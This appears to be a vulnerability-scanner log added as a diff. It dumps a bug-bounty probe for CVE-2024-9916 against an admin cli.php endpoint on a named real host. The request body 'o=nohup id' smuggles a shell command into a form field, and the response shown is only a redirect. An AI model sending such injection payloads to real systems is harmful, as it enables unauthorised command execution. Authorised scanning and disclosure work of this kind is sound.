@@ -1,0 +1,31 @@
+[CVE-2024-9916] Dumped HTTP request for http://akurateco.bitpanda.com/app/modules/ut-cac/admin/cli.php
+
+
+POST /app/modules/ut-cac/admin/cli.php HTTP/1.1
+Host: akurateco.bitpanda.com
+User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 10
+Content-Type: application/x-www-form-urlencoded
+Origin: http://akurateco.bitpanda.com
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+o=nohup id
+[CVE-2024-9916] Dumped HTTP response http://akurateco.bitpanda.com/app/modules/ut-cac/admin/cli.php
+
+HTTP/1.1 308 Permanent Redirect
+Connection: close
+Content-Length: 164
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:50:50 GMT
+Location: https://akurateco.bitpanda.com/app/modules/ut-cac/admin/cli.php
+
+<html>
+<head><title>308 Permanent Redirect</title></head>
+<body>
+<center><h1>308 Permanent Redirect</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
